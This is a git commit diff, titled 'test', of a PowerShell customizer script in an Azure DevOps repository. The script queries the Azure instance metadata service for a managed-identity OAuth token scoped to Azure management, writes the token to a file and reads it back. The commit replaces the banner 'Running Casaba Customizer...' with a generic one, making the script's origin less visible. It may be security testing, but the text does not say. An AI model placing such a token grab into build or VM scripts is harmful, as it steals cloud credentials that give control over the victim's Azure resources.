1ec8750b66adf9942b33d1dd1a5a42d6c8dad12c
pcarulli <pierson.carulli@wsu.edu>
2021-04-28 13:36:37 -0700

    test

--- .visualstudio.com/_git/customizers/powershellScripts/custom.ps1
+++ .visualstudio.com/_git/customizers/powershellScripts/custom.ps1
@@ -1,5 +1,5 @@
 filter timestamp {"$(Get-Date ([datetime]::UtcNow) -Format G) UTC: $_"}
-Write-Output "Running Casaba Customizer..." | timestamp
+Write-Output "Running..." | timestamp
 Invoke-WebRequest "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H @{"Metadata" = "true"} -UseBasicParsing -OutFile meta.txt
 $result=Get-Content "meta.txt"
 Write-Output "Finishing up..."
